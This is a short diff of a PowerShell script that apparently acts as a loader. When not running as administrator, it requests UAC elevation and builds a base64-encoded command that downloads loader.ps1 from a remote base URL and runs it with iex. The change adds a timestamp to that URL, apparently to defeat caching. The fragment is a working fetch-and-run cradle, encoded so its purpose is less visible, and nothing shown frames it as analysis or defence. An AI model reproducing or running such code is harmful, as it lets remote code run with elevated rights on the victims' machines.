@@ -12,7 +12,7 @@ $isAdmin = [Security.Principal.WindowsPrincipal]::new(
 
 if (-not $isAdmin) {
     Write-Host "[!] Not admin. Requesting elevation via UAC..."
-    $scriptUrl = "$scriptBase/loader.ps1"
+    $scriptUrl = "$scriptBase/loader.ps1?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
     $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
         "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
     ))
